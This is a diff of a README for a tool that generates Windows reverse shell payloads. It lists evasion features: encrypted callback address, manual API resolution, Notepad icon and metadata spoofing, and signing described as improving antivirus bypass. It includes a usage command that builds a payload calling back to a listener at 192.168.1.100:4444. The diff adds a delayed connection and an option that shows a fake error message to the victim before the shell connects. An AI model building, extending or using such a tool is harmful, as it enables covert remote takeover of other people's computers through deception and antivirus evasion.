@@ -11,6 +11,7 @@ This tool generates a Windows reverse shell payload with **AES-encrypted IP and 
 - 🪟 Native Windows API usage (with manual `GetProcAddress` resolution)
 - 🎭 Optional Notepad spoofing (icon + metadata)
 - 🛠️ Easy cross-compilation via MinGW (Linux)
+- ⏱️ Desynchronous connection (Around 30s)
   
 ---
   
@@ -29,6 +30,7 @@ python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad --sign
 **--notepad** : Mimic Notepad metadata and icon.  
 **--keep** : Keep temporary files (.c, .rc, .res) after building.  
 **--sign** : Uses sign_exe.py to sign the exe, improving AVs bypass.  
+**--gui** : Display a error message on launch, waiting for user input before starting connection.
   
 ---
   
